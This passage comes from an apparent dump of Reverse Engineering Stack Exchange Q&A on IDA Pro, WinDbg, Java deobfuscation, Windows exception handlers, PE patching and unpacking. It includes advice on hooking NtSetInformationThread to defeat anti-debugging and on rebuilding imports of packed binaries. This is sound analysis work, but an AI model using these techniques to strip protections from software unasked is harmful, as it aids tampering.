    else if (infoObject.code == ""NetStream.Play.Stop"")
    {
        var _local2 = setTimeout(video_replay, 0);
    }
    else if (infoObject.code == ""NetStream.Buffer.Flush"")
    {
         trace(my_ns.time);
    }
};
</code></pre>
","<p><a href=""https://www.youtube.com/watch?v=EDUyzrxR-mY"" rel=""nofollow"">https://www.youtube.com/watch?v=EDUyzrxR-mY</a></p>

<p>game found enjoy it if you like. This is the real game from that flash teaser</p>

<p>The game I found myself as well while I was visiting chinese upload websites
<a href=""http://bdtg.37.com/s/1/1789/22338.html?baidu_key=395e3e9222fd2722"" rel=""nofollow"">http://bdtg.37.com/s/1/1789/22338.html?baidu_key=395e3e9222fd2722</a></p>
","7975"
"java byte code equivalent of IDA function signatures","573","","<p>I remember IDA (Interactive Disassembler) has a really neat feature of function signatures where you dont have to reverse engineer code found inside standard libraries.<br>
Is there a similar feature for java byte code especially for obfuscaticated code? </p>
","<p>There is no similar feature for java byte code.</p>

<p>When you compile a C program, and statically link it to a standard library, the library code will be present, more or less unmodified, within the binary (except for addresses which will change), but there won't be any hint that a particular function had a particular name before being compiled (unless debugging is enabled while compiling/linking). But, any given function has a more or less fixed pattern of bytes, and by recognizing these bytes, IDA can assign the original name to the function.</p>

<p>In java bytecode, there is no neccesity to do this. Function names, variable names, and similar information is present in the compiled bytecode anyway. The ""standard library"", <code>rt.jar</code>, isn't embedded into the bytecode either, so if a class uses an <code>ArrayList</code>, the class will have a reference to <code>java.util.ArrayList</code> even after the obfuscation process. So, nothing to do here for a signature analyzer.</p>

<p>If the application choses to obfuscate the standard library as well, it needs to include that obfuscated library into its own jar files. This will probably raise some licensing issues, but apart from that, as the obfuscator will rename methods and fields, the byte code of that obfuscated library will be too different from the original byte code to be recognizable by a feature like IDA's FLIRT. Also, you can't just rename the method in IDA, because you'd have to modify all the references as well.</p>

<p>However, there is at least one open source project that has a similar problem like yours, and they seem to have solved it quite well. <a href=""https://minecraft.net/"" rel=""nofollow"">Minecraft</a> is a popular game that includes a server that's written in java (and obfuscated); the <a href=""https://www.spigotmc.org/"" rel=""nofollow"">Spigot</a> project decompiles this server, changes some things, adds an API, and distributes the result. Specifically, to avoid licensing issues, they distribute a build system which downloads, decompiles, patches, and recompiles the minecraft server on the user's machine.</p>

<p>They use the <a href=""https://github.com/fesh0r/fernflower"" rel=""nofollow"">fernflower</a> decompiler, which has an option to rename symbols while decompiling, and include an extensive map of obfuscated-to-readable symbol names. Example:</p>

<pre><code>AttributeInstance a ()LIAttribute; getAttribute
AttributeInstance a (D)V setValue
AttributeInstance e ()D getValue
AttributeMapServer b ()Ljava/util/Set; getAttributes
AxisAlignedBB b (DDD)LAxisAlignedBB; grow
</code></pre>

<p>The source code, which is generated using these maps, is obviously way more readable than the original one. And, at least for the spigot project, recompiling this source (after adding some patches to create an API) yields a working minecraft server.</p>

<p>So, maybe, this could be a way for you to proceed - use fernflower to decompile your classes, load them into an editor to find some useful code and assign readable class names, write a mapping file, and repeat this a few times. Then, when you want to do some dynamic analysis, recompile the decompiled java code and load that into IDA.</p>

<p>Of course, this approach still has some problems:</p>

<ul>
<li>you will still have to identify each function manually - but as i said, you probably won't find any standard library functions in your code anyway. And, there are no existing signature libraries for whichever method you use, so there's probably no way around that.</li>
<li>the decompiled/recompiled code may not work, because of bugs/shortcomings in the java decompiler itself</li>
<li>the decompiled/recompiled code may not work because of the obfuscator; for example, the obfuscator might replace all string constants with something like <code>Obfuscator::decode(""some_crypted_stuff"")</code>, where the <code>decode</code> function uses the name of the calling class as its decryption key, meaning the decryption fails when the class gets renamed</li>
<li>the obfuscator might bring its own class loader, which mangles the class name before loading it; for example, it might know to turn a <code>com.obfuscate.SOME_BASE_64_STRING</code> class into the decoded base64 string, so <code>com.obfuscate.amF2YS51dGlsLkFycmF5TGlzdAo.something()</code> would call <code>java.util.ArrayList.something()</code>. This breaks the visible connection between caller and callee (but the name mapping could solve this problem quite well and you could automate a lot)</li>
</ul>

<p>Even if you can't get a decompiled, recompilable, version of your binary, you can probably write some code that works on the decompiled source to identify functions by their behaviour, using some heuristics, Then, have your code write a mapping table, and write a python plugin to import that mapping table into your code as comments.</p>

<p>It's questionable if these approaches beat manual reverseengineering within IDA, but as IDA doesn't have this feature, and as there are no generic signature libraries (and they wouldn't work anyway, see above), it's the best i have to offer.</p>

<h2>Edit 2016-04-17</h2>

<p>Turns out i have a little project where i could use some deobfuscation mapping myself, and checked into the deobfuscation process of the minecraft decompiling step a bit more.</p>

<p>Turns out they don't even use fernflowers remapping feature. Instead, they have their own set of tools. These are lamentably underdocumented, but there seems to be a <a href=""https://github.com/md-5/SpecialSource"" rel=""nofollow"">GitHub Repository</a>.</p>

<p>The first one, <a href=""https://hub.spigotmc.org/stash/projects/SPIGOT/repos/builddata/browse/bin/SpecialSource.jar"" rel=""nofollow"">SpecialSource.jar</a>, compares an obfuscated jar with an unobfuscated version, and generates a mapping table. This seems to allow to build new tables quickly when a new version of the obfuscated original comes out. There is, however, no documentation about what's exactly being compared.</p>

<p>The second one, <a href=""https://hub.spigotmc.org/stash/projects/SPIGOT/repos/builddata/browse/bin/SpecialSource-2.jar"" rel=""nofollow"">SpecialSource-2.jar</a>, remaps class and method references and names <em>directly in the jar file</em>, without a decompilation/compilation step, so it avoids all the problems that come with that. So once you have a mapping file, you can apply it to the jar to get an output jar, which you can then feed into IDA, or a decompiler of your choice.
Usage is</p>

<pre><code>java -jar /path/to/SpecialSource-2.jar map -m mapping.csrg \
-i obfuscated.jar -o readable.jar
</code></pre>

<p>with the mappings file looking like this</p>

<pre><code># This renames a class, given the obfuscated name and the readable one
com/example/ab/a MyNiceClassName
# This renames a method, given the class, method, signature, and readable name.
MyNiceClassName a (D)I doubleToInt
</code></pre>
","12473"
"Decompile ""Internal Call""","571","","<p>I have a .NET method which is marked as an ""Internal Call"", meaning that it is implemented within the CLR itself. Is there any way to locate the code for and/or decompile such a method?</p>
","<p>If you use the windbg sos extension you can step into the internal calls - which are unmanaged code. The documentation for using sos is a bit tricky to sort out IMO. This link is helpful for learning the sos commands: <a href=""http://msdn.microsoft.com/en-us/library/bb190764(v=vs.110).aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/bb190764(v=vs.110).aspx</a>. To load SOS I use:</p>

<pre><code>.loadby sos clr ; for .NET 4 and higher
.loadby sos mscorwks ; for .NET 2
</code></pre>

<p>However you have to wait until the .NET DLLs have been loaded before those commands work, so you either have to set a breakpoint or make sure the managed code has some kind of wait (for input or something else) to allow the process to load the .NET DLLs.</p>
","3344"
"Static analysis data combined with dynamic analysis knowledge","570","","<p>What I'm doing now is placing an awful lot of comments about function variable values, global variable values as comments in my IDA database, which I find ugly after a while and obviously not a best practice. </p>

<p>I was wondering if it's possible to store runtime variable values of your target process from a dynamic debugging session in your IDA database(or any other storage/tool) in some way. For example you run IDA debugger, or some external tool like olly/immunity, and store the encountered values (globals, function parameters) in IDA, so you can see actual values when doing your static analysis in IDA (for example on mouse over).</p>

<p>I don't know if anybody done this before, but it think it would be a really helpful feature.</p>

<p><strong>Is this possible, any similar tool/solution out there you know of? How do you process static+dynamic data of the reversed application?</strong> </p>

<p>I'm not tied to IDA, but I find that environment to be most fitting for storing my result data. I'm interested in any solution.</p>
","<blockquote>
  <p><a href=""https://github.com/deresz/funcap"" rel=""noreferrer""><strong><code>funcap</code></strong></a> uses IDA's debugging API to record function
  calls in a program together with their arguments (before and after).</p>
  
  <p>This is very useful when dealing with malware which uses helper
  functions to decrypt their strings, or programs which make many
  indirect calls.</p>
</blockquote>

<p><img src=""https://i.stack.imgur.com/gtH5U.png"" alt=""a""></p>
","3525"
"Why can I access FS:[0] in OllyDbg but not offsets to CS,DS,SS?","566","","<p>I can access the FS:[0h] which points to the SEH chain but cannot do the same for other segment registers.What is the reason for it ?</p>

<p>Also,I was debugging an exe which has PTRD at 0x600 and AEP at 0x1000 (same as PTRD) but at offset 0x400 I see some instructions which I have seen in some other files too. In my sample it is unreachable code,but in one test exe which I wrote using WINASM/MASM it was same sequence of instructions just had a bit more instruction .If I change the AEP to 400 the assembly is as follows:</p>

<pre><code>00400400    6A 00           PUSH 0  
00400402    68 05304000     PUSH 00403005  
00400407    68 00304000     PUSH 00403000  
0040040C    6A 00           PUSH 0  
0040040E    E8 17040000     CALL 0040082A  
00400413    6A 00           PUSH 0  
00400415    E8 16040000     CALL 00400830  
0040041A    E8 17040000     CALL 00400836  
0040041F    E8 1E040000     CALL 00400842  
00400424    E8 13040000     CALL 0040083C  
00400429    C3              RETN     
</code></pre>

<p>I wrote a Hello world program in MASM which had AEP at 0x1000 the code seems similar but  I can debug it  i.e it is not unreachable/dead code like previous one.It is as follows:</p>

<pre><code>00401000    6A 00           PUSH 0                                   
00401002    68 00304000     PUSH OFFSET 00403000                     
00401007    68 06304000     PUSH OFFSET 00403006                     
0040100C    6A 00           PUSH 0                                   
0040100E    E8 0D000000     CALL &lt;JMP.&amp;user32.MessageBoxA&gt;           
00401013    A3 14304000     MOV DWORD PTR DS:[403014],EAX
00401018    33C0            XOR EAX,EAX
0040101A    50              PUSH EAX                                 
0040101B    E8 06000000     CALL &lt;JMP.&amp;kernel32.ExitProcess&gt;         
00401020    FF25 08204000   JMP DWORD PTR DS:[&lt;&amp;user32.MessageBoxA&gt;]
00401026    FF25 00204000   JMP DWORD PTR DS:[&lt;&amp;kernel32.ExitProcess 
</code></pre>

<p>So my question is how come code is coming in my sample at offset 0x400,what is the use of this code ,is there some compiler which is putting it out there?  </p>

<p>Note:Its a virus sample and I am a starter.Thanks for the answers in advance...</p>
","<p>In Windows, the total space the process is intended to see is the same in the CS, DS, and SS registers. Windows makes the executable file, as well as any DLLs, open files, allocated memory segments, etc. into this address range, and you'll see the same memory - and the same contents - no matter if you access cs:[something], ds:[something] or ss:[something]*.</p>

<p>On a 32 bit system, the reachable memory in this ""big space"" is 4 GB.</p>

<p>FS is different; it's a separate part of memory outside your normal address space. You can't access that memory using either of the normal registers. And its size is only a few bytes - you can't access FS:[100000h], for example, as the PEB isn't that big.</p>

<p>Back to the linear 4 GB space: the fact that 4 GB are ""reachable"" comes from 32 bit pointers (2^32); but it doesn't mean every address within that range is actually mapped to physical memory. Whenever windows needs a chunk of memory, it selects an address within that space, maps physical memory to it, and uses that memory. For example, when an executable gets loaded, windows will always** load it to <code>400000h</code> . This is why your program starts at <code>401000h</code> - your entry point of <code>1000h</code>  is relative to the load address, not to 0. Or, when windows loads a DLL, it will start with <code>80000000</code>, adjust that value down to below other DLLs, randomize it a bit (for ASLR), and use that address. If your DLL has an entry point at <code>1000h</code>, and gets loaded at <code>63000000h</code>, execution will start at <code>63001000h</code>.</p>

<p>The fact you can't access cs:[0] or ds:[0] is on purpose - windows doesn't map anything to the first bytes of the address space to make your program crash (technically: throw an execption) if it tries to access memory through a NULL pointer. This is, as well, the reason why executables get loaded higher in memory, you don't want a null pointer access to ever succeed accidentally.</p>

<p>The next thing to consider is <em>how</em> windows loads PE files - instead of parsing the file, and copying only the regions to memory that are actually used, it just slurps in the whole file to the start address***. Which means, the PE header gets loaded right to the load address. The pseudo code you've seen is just a part of the PE header that happens to be at offset <code>400h</code> in your PE file.</p>

<p>To become familiar with memory layout of the ""big"" cs/ds/ss segment, i recommend the <code>vmmap</code> tool from the sysinternals collection; attach it to some running processes and check their memory map. The details will probably become much more clear from that than from any theoretical explanation.</p>

<p>(*) However, depending on access rights, you may not be allowed to write to those parts of this space that are mapped to code, or execute those parts that are mapped to data.</p>

<p>(**) for a somewhat fuzzy definition of always, the details aren't important right now</p>

<p>(***) Technically, it memory maps the file and relies on the paging subsystem to read it from disk, but again, this isn't important right now.</p>
","9274"
"IDA Pro only recognizes my files as BINARY","565","","<p>I am trying to disassemble some various files, and IDA does not recognize them. Is there anyway to add more file types to IDA Pro? I am running ida 6.5</p>
","<p>You would need to create a Loader plugin for them. See the <code>ldr</code> directory in the IDA Pro SDK.</p>

<p>Once the Loader is built, you would copy it to the <code>loaders</code> subdirectory under IDA Pro's directory.</p>

<p>Here's a nice blog entry on writing IDA Pro file loaders in higher level languages: <a href=""http://www.hexblog.com/?p=110"" rel=""nofollow"">http://www.hexblog.com/?p=110</a></p>
","3353"
"What are the Vectored Continue Handlers","564","","<p>Practically everyone knows what <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms681420(v=vs.85).aspx"" rel=""nofollow noreferrer"">Vectored Exception Handlers</a> are, but I couldn't find a lot of information about the similar ""Vectored Continue Handlers"" and related functions I encountered today, such as <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms679273(v=vs.85).aspx"" rel=""nofollow noreferrer"">AddVectoredContinueHandler</a> and <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms680567(v=vs.85).aspx"" rel=""nofollow noreferrer"">RemoveVectoredContinueHandler</a>.</p>

<p>The prototype of <code>AddVectoredContinueHandler</code> is very similar to <code>AddVectoredExceptionHandler</code>'s prototype:</p>

<pre><code>PVOID WINAPI AddVectoredContinueHandler(
  _In_ ULONG                       FirstHandler,
  _In_ PVECTORED_EXCEPTION_HANDLER VectoredHandler
);
</code></pre>

<p>And to make things more confusing it accepts a <code>PVECTORED_EXCEPTION_HANDLER</code>, just as <code>AddVectoredExceptionHandler</code> does.</p>

<p>What is the purpose of Vectored <strong>Continue</strong> Handlers and how are they used?</p>
","<p>Unfortunately MSDN and windows API documentation is really scarce here, and I had difficulties finding anything other than the minimal description in MSDN.</p>

<p>It turns out the Vectored <em>Continue</em> Handlers are maintained in a Linked list very similar to the one used for Vectored <em>Exception</em> Handlers. They are so similar, that the function's prototypes are practically identical.</p>

<p>Take a look at:</p>

<pre><code>PVOID WINAPI AddVectoredExceptionHandler(
  _In_ ULONG                       FirstHandler,
  _In_ PVECTORED_EXCEPTION_HANDLER VectoredHandler
);
</code></pre>

<p>Compared to:</p>

<pre><code>PVOID WINAPI AddVectoredContinueHandler(
  _In_ ULONG                       FirstHandler,
  _In_ PVECTORED_EXCEPTION_HANDLER VectoredHandler
);
</code></pre>

<p>Luckily, Vectored <em>Exception</em> Handlers are more commonly used and documented. For example, MSDN has a <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms681420(v=vs.85).aspx"" rel=""nofollow noreferrer"">page</a> about VEHs, containing the following paragraph:</p>

<blockquote>
  <p>Vectored exception handlers are an extension to structured exception handling. An application can register a function to watch or handle all exceptions for the application. Vectored handlers are not frame-based, therefore, you can add a handler that will be called regardless of where you are in a call frame. Vectored handlers are called in the order that they were added, after the debugger gets a first chance notification, but before the system begins unwinding the stack.</p>
</blockquote>

<p>The same page has only a laconic reference to the Add and Remove VCH APIs.</p>

<p>After some research and reverse engineering of ntdll, I realized VCHs and VEHs are quite similar in implementation. For example, see how <code>AddVectoredExceptionHandler</code> and <code>AddVectoredContinueHandler</code> are identical except for the <code>VectoredListIndex</code>, specifying they should be added to the second <code>VectorHandlerList</code> in the case of VCH:</p>

<p><a href=""https://i.stack.imgur.com/NcS2S.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/NcS2S.png"" alt=""AddVectoredExceptionHandler VS AddVectoredContinueHandler""></a></p>

<p>Similarly, <code>RemoveVectoredExceptionHandler</code> and <code>RemoveVectoredContinueHandler</code> are identical except for the vectored handlers list index.</p>

<p>Inside <code>RtlpAddVectoredHandler</code>, the <code>VectoredListIndex</code> is used as an index in  <code>_LdrpVectorHandlerList</code>, which is an array of size two of a linked list structure.</p>

<p>In the following picture we can see how <code>VectoredListIndex</code> is multiplied by the size of the list anchor object, and then added to `_LdrpVectorHandlerList, which is the base offset of the array.</p>

<p><a href=""https://i.stack.imgur.com/WukZJ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/WukZJ.png"" alt=""VectoredListIndex used as an array index""></a></p>

<p>And now we're getting to the interesting part - where are VEH and VCH different?</p>

<p>If we walk up the cross references to <code>_LdrpVectorHandlerList</code>, we'll notice the two flows leading up to the add/remove functions is practically identical. Aside from those four APIs, we're left with only one other function, called <code>RtlpCallVectoredHandlers</code> which is undocumented.</p>

<p>It's pretty obvious from the name, but <code>RtlpCallVectoredHandlers</code> iterates over the vector (vector is selected according to the index) and calls all Handlers in a sequence. Once a Vectored Handler returns <code>EXCEPTION_CONTINUE_EXECUTION</code> the iteration is interrupted by prematurely returning from <code>RtlpCallVectoredHandlers</code> and execution resumes.</p>

<p>The sole function calling <code>RtlpCallVectoredHandlers</code> is <code>RtlDispatchException</code>, which is the main function dispatching exception handlers.</p>

<p>First, it executes all exception handlers, starting with the first Vectored Exception Handler to the last, and then going through all Structured Exception Handlers unfolding them through the stack. The first exception to return <code>EXCEPTION_CONTINUE_EXECUTION</code> will stop the entire exception handlers execution process.</p>

<p>Like VEHs, when VCHs are called, they are called one by one until one of them returns <code>EXCEPTION_CONTINUE_EXECUTION</code> (just as when VEHs are called), which signals <code>RtlpCallVectoredHandlers</code> to <code>break</code> the Vectored Handlers calling loop. This is interesting because it means installing a Vectored Continue Handler as first lets you hide exceptions from subsequent VCHs.</p>

<p>Vectored Continue Handlers are called under the following circumstances:</p>

<ol>
<li>If an exception handler (either VEH or SEH) was called and returned <code>EXCEPTION_CONTINUE_EXECUTION</code></li>
<li>If for some reason SEH validation failed (See SafeSEH and related mechanisms), VCHs will also be called, but the execution will not continue afterwards.
This can be seen in the many flows that lead to the second <code>RtlpCallVectoredHandlers</code> call without setting <code>bl</code> to <code>1</code> and leaving it equal to zero before moving it to <code>al</code> and returning <code>false</code>. The calling function, <code>KiUserExceptionDispatcher</code> will then call <code>ZwRaiseException</code> if the value returned by <code>KiUserExceptionDispatcher</code> is <code>false</code>.
<a href=""https://i.stack.imgur.com/5Xss7.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/5Xss7.png"" alt=""enter image description here""></a></li>
</ol>
","14993"
"Windbg 'as' command in log breakpoint","564","","<p>I want to break the debugee as it opens a known file, using <code>windbg</code>. As <code>$scmp</code> doesn't accept direct address, I have to use <code>as</code> (<code>windbg</code> alias command). So, I put a conditional breakpoint at <code>CreateFileA</code>:</p>

<pre><code>bu Kernel32!CreateFileA ""as /ma ${/v:fName} poi(esp+4);.echo ${fName};...;g""
</code></pre>

<p>It always prints the same (first) file name. I also tried script files</p>

<pre><code>bu ... ""$&gt;&lt; bpCmd""
bu ... ""$$&gt;&lt; bpCmd""
</code></pre>

<p><em><code>bpCmd</code> content:</em></p>

<pre><code>as /ma ${/v:fName} poi(esp+4);
.echo ${fName};
...
g;
</code></pre>

<p>It didn't work as well.</p>

<p>So, why <code>as</code> doesn't work in log breakpoints?</p>
","<p><code>The alias needs to be evaluated</code> <strong>everytime</strong> the break point is hit<br>
else it will print the old alias only<br>
to force alias evaluation` enclose the  .echo and other commands inside a <strong>.block{}</strong> </p>

<pre><code>crefil:\&gt;dir /b
CreateFile.cpp    
crefil:\&gt;type CreateFile.cpp
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
int main (void)
{
    PWIN32_FIND_DATA lpFindFileData = 
            (PWIN32_FIND_DATA) calloc(1 , sizeof( WIN32_FIND_DATA));
    FILE *fp;
    errno_t err;
    if (lpFindFileData)
    {
        HANDLE hFind = FindFirstFile(""*.*"",lpFindFileData);
        if ( hFind != INVALID_HANDLE_VALUE )
        {
            do
            {
                printf(""%s\n"",lpFindFileData-&gt;cFileName);
                if ( (err = fopen_s(&amp;fp,lpFindFileData-&gt;cFileName,""rb"") ) == 0 )

                    if (fp)
                        fclose(fp);
            }while( ( FindNextFile(hFind,lpFindFileData) ) != FALSE );
            FindClose(hFind);
            free(lpFindFileData);
        }
    }
    return 0;
}
</code></pre>

<p>as in windbg conditional breakpoint    </p>

<p><strong>crefil:>cdb -c ""bp kernel32!CreateFileA \""as /ma ${/v:fname} poi(@esp+4);.block
 { .echo fname };gc\"";g;q"" CreateFile.exe</strong></p>

<pre><code>0:000&gt; cdb: Reading initial command 'bp kernel32!CreateFileA ""as /ma ${/v:fname}
 poi(@esp+4);.block { .echo fname };gc"";g;q'
.
..
CreateFile.cpp
CreateFile.exe
CreateFile.obj
CreateFile.pdb
 vc100.pdb
quit:
</code></pre>
","4391"
"Hide data areas in IDA IDC","561","","<p>I'm using the following IDC function to copy the RAM Data and Code sections from the packed binary, into the correct runtime locations for my Fujitsu FR system:</p>

<pre><code>static idc_memcpy(source, dest, count, desc)
{
    auto i, val;

    SetCharPrm(INF_GENFLAGS, INFFL_LOADIDC|GetCharPrm(INF_GENFLAGS));
    Message(""Copy %a: Start\n"", dest);

    for(i = 0; i &lt; count; i = i + 2 )
    {
        val = Word(source + i);
        PatchWord(dest + i, val);
    }

    SetCharPrm(INF_GENFLAGS, ~INFFL_LOADIDC&amp;GetCharPrm(INF_GENFLAGS));

    MakeUnknown(source,count,DOUNK_EXPAND+DOUNK_DELNAMES);

    HideArea(source, source+count-1, desc, """", """", -1);
    SetHiddenArea(source, 1 );
    Message(""Copy %a: End\n"", dest);

}
</code></pre>

<p>But when I go to the source address I see: </p>

<pre><code>ROM:00447E8C ; [0000C878 BYTES: BEGIN OF AREA RAM Data2 Source. PRESS KEYPAD ""-"" TO COLLAPSE]
ROM:00447E8C unk_447E8C:     .byte 0xFF              ; DATA XREF: Tsk32+176o
ROM:00447E8D                 .byte 0xFF
ROM:00447E8E                 .byte 0xFF
ROM:00447E8F                 .byte 0xFF
ROM:00447E90                 .byte    0
ROM:00447E91                 .byte 0x30 ; 0
ROM:00447E92                 .byte    0
ROM:00447E93                 .byte    0
</code></pre>

<p>I was hoping/expecting to have that area hidden, what am I doing wrong. If I press keypad <kbd>-</kbd> I get the error message:</p>

<blockquote>
  <p>IDA failed to display the program in graph mode.
  Only instructions belonging to functions can be displayed in graph mode.</p>
</blockquote>
","<p>Solved it after trying many things.</p>

<p>I had to change the data area to a byte array with</p>

<pre><code>    MakeByte(source);
    MakeArray(source, byte_count);
</code></pre>

<p>after the <code>MakeUnknown</code>, and then call <code>SetHidden</code> with value <code>0</code></p>

<p>Also to the Hiding the Area with keyboard, the new default keys are <kbd>Ctrl</kbd>+<kbd>-</kbd>, the displayed text in IDA is wrong.</p>

<p>thus final code was:</p>

<pre><code>static idc_memcpy(source, dest, byte_count, desc)
{
    auto i, val;

    SetCharPrm(INF_GENFLAGS, INFFL_LOADIDC|GetCharPrm(INF_GENFLAGS));
    Message(""Copy %a: Start\n"", dest);

    for(i = 0; i &lt; byte_count; i = i + 2 )
    {
        val = Word(source + i);
        PatchWord(dest + i, val);
    }

    SetCharPrm(INF_GENFLAGS, ~INFFL_LOADIDC&amp;GetCharPrm(INF_GENFLAGS));

    MakeUnknown(source,byte_count,DOUNK_EXPAND+DOUNK_DELNAMES);
    MakeByte(source);
    MakeArray(source, byte_count);

    HideArea(source, source+byte_count, desc, """", """", -1);
    SetHiddenArea(source, 0 );
    Message(""Copy %a: End\n"", dest);
}
</code></pre>
","4780"
"Is there any Dynamic Binary Instrumentation frameworks for Windows exposing an Intermediate Representation?","560","","<p>There are some excellent DBI frameworks for Windows (Intel PIN, DynamoRIO...) but unfortunately none of them expose an IR afaik.
I am looking for something like Valgrind's VEX that works on Windows.</p>

<p>Any pointers / references would be greatly appreciated. Thanks in advance!</p>
","<p>If you are searching for lifting assembly to IR,
look at either <a href=""http://bap.ece.cmu.edu"" rel=""nofollow"">BAP</a> or <a href=""https://dslabgit.epfl.ch/git/s2e/s2e.git"" rel=""nofollow"">RevGen</a>.</p>
","4005"
"What is import reconstruction and why is it necessary?","560","","<p>When reading about unpacking, I sometimes see an ""import reconstruction"" step. What is this and why is it necessary?</p>
","<p>In a typical, non-packed Windows PE executable, the header contains metadata that describes to the operating system which symbols from other libraries that the executable depends upon.  The operating system's loader is responsible for loading those libraries into memory (if they are not already loaded), and for placing the addresses of those imported symbols into structures (whose locations are also specified by the metadata) within the executable's memory image.  Packers, on the other hand, often destroy this metadata, and instead perform the resolution stage (which would normally be performed by the loader) itself.  The goal of unpacking is to remove the protections from the binary, including the missing import information.  So the analyst (or unpacking tool) must determine the collection of imports that the packer loads for the executable, and re-create metadata within the unpacked executable's image that will cause the operating system to properly load the imports as usual.  </p>

<p>Typically in these situations, the analyst will determine where within the executable's memory image the import information resides.  In particular, the analyst will usually locate the <code>IMAGE_THUNK_DATA</code> arrays, which are <code>NULL</code>-terminated arrays that contain the addresses of imported symbols.  Then, the analyst will run a tool that basically performs the inverse of <code>GetProcAddress</code>:  given one of these pointers to imported symbols, it will determine in which DLL the pointer resides, and which specific exported entry is referred to by the pointer.  So for example, we might resolve <code>0x76AE3F3C</code> to <code>Kernel32!CreateFileW</code>.  Now we use this textual information to recreate <code>IMAGE_IMPORT_DESCRIPTOR</code> structures describing each imported DLL, use the original addresses of the <code>IMAGE_THUNK_DATA</code> arrays, store the names of the DLLs and imported symbols somewhere in the binary (perhaps in a new section), and point the <code>IMAGE_THUNK_DATA</code> entries to those new names.</p>

<p><a href=""http://www.woodmann.com/collaborative/tools/index.php/ImpREC%E2%80%8E"">ImpRec</a> is a popular tool that automates most or all of this process, depending upon the packer.  What I just described is reflective of reality in about 95% of cases.  More serious protections such as video game copy protections and tricky custom malware use further tricks that stymie the reconstruction process.</p>
","2145"
"Patching PE File - Adding data","558","","<p>After opening a PE file with  a disassembler, I know which instructions I have to patch. And if I have to add some data I can adjust the PE file structure manually so that it gets parsed correctly and executes.</p>

<p>Example,
Replace <code>EB 1C</code> with <code>E9 1C FD</code></p>

<p>Now, the question. I have to modify multiple locations and manually adjusting values is killing me. Can I do this with <a href=""http://code.google.com/p/pefile"" rel=""nofollow"">code.google.com/p/pefile</a> from python, which I am assuming will help in adjusting? Or is there any other module I can use? Some sample code I can find?</p>
","<p>It is not that easy or it is rather error prone if you are going to insert 3 bytes in place of 2 bytes you would be better off if you do a <code>trampoline</code> (jump to some other place do what you want jump back to next instruction by employing trampolining you can also save the registers</p>

<p>a small sample could be like </p>

<pre><code>`jmp SomePlace` &lt;---destroy old bytes and insert an unconditional jump  
NextInst:      &lt;----|_________________________  
 ..                                           |    
SomePlace:                                    |   
""dancing with wolves""                         |  
jmp NextInst &lt;------- this will jump back to-&gt;|  
</code></pre>

<p>in case you are interested in replacing two bytes with two bytes then almost all hex editors have some form of search and replace functionality </p>

<p>or you can write a simple script in your favorite utility </p>

<p>a simple windbg example script for replacing all the <code>push XXXX</code> <code>68 XXXXXX</code> bytes to <code>EB FE</code> 
this example is a prototype you need to tweak it based on the pattern you get</p>

<pre><code>.foreach /pS4 /ps 9 ( place { # 68?? 401000 l?0x20} ) {u place L1;ew place feeb;u place L1 } 
</code></pre>

<p>all this does is <code>search</code> the dis assembly for the <code>pattern 68??</code> (blind search can alter unintended data use with caution) 
when found uses the address where it was found to replace the two bytes 68XX with EB FE 
it does this for all the bytes that are found in a given range in addition to this it also prints out the assembly prior to modification and after modification</p>

<pre><code># 68??  pattern search command in windbg 
401000 l?0x20  start search from 0x401000 end at 401020 
u place l1 disassemble one instruction when pattern found
ew place feeb  write word 0xfeeb at found address  
dis assemble again
loop with foreach where ps and pS are skip before and skip after bytes 
</code></pre>

<p>a sample output of above script </p>

<pre><code>    0:000&gt; .foreach /pS4 /ps 9 ( place { # 68?? 401000 l?0x20} ) {u place L1;ew place feeb;u place L1 } 
    msgbox!start+0x2 [msgbox.asm @ 17]:
    00401002 6800304000      push    offset msgbox!MsgCaption (00403000)
    msgbox!start+0x2 [msgbox.asm @ 17]:
    00401002 ebfe            jmp     msgbox!start+0x2 (00401002)
    msgbox!start+0x7 [msgbox.asm @ 17]:
    00401007 6819304000      push    offset msgbox!MsgBoxText (00403019)
    msgbox!start+0x7 [msgbox.asm @ 17]:
    00401007 ebfe            jmp     msgbox!start+0x7 (00401007)
</code></pre>
","2791"
"Canonical method to circumvent the ZwSetInformationThread antidebugging technique","557","","<p>I'm sure many of you are familiar with this classic antidebug trick accomplished by calling <code>ZwSetInformationThread</code> with <code>ThreadInformationClass</code> set to 0x11. Although many OllyDbg modules exist for the purposes of revealing the existence of threads hidden with this method, I haven't been able to find any information on the canonical technique employed to unhide these threads in OllyDbg. </p>

<p>Is the function generally hooked in user mode (e.g <code>SetWindowsHookEx</code>), or is it more pragmatic to patch instructions that either call the NTDLL function directly or system calls which indirectly invoke it?</p>
","<p>SetWindowsHookEx isn't really used for this sort of hooking as far as I'm aware. </p>

<p>You could hook NtSetInformationThread in the import of the binary you want to analyze and make it always return success on ThreadHideFromDebugger but not forward the call to the actual function. This would be weak since GetProcAddress or manual imports would bypass it.</p>

<p>You could hook the NtSetInformationThread function by inserting a call to your own function in the function prologue and then ignore ThreadHideFromDebugger while forwarding the rest to the original function.</p>

<p>I strong advice against it but for the sake of completeness, you could also hook NtSetInformationThread in the <a href=""http://en.wikipedia.org/wiki/System_Service_Dispatch_Table"" rel=""noreferrer"">system service dispatch table</a>. There's a good dump of the table for different Windows versions <a href=""http://j00ru.vexillium.org/ntapi/"" rel=""noreferrer"">here</a>. If you want to get the index in the table yourself you can just disassemble the NtSetInformationThread export from ntdll.dll.</p>

<p>If you're interested in more anti-debugging techniques strongly recommend reading <a href=""http://pferrie.host22.com/papers/antidebug.pdf"" rel=""noreferrer"">Peter Ferrie's awesome anti-debugging reference</a>.</p>
","210"
"Assembly variable meaning","556","","<p>Im newbie at reverse engineering and I was wondering what is the meaning of declaration <code>var_18 = byte ptr -18</code> and the others like it in the picture.</p>

<p><img src=""https://i.stack.imgur.com/0Si9w.png"" alt=""IDA Pro screenshot""></p>

<p>I know that <code>byte ptr</code> means it is a pointer to a byte variable, but why does it have negative value. And also why do all of them have the same address?</p>
","<p>The dis-assembler display all the variables as having the same address, which is the function's first command (004014CE push ebp in this case).</p>

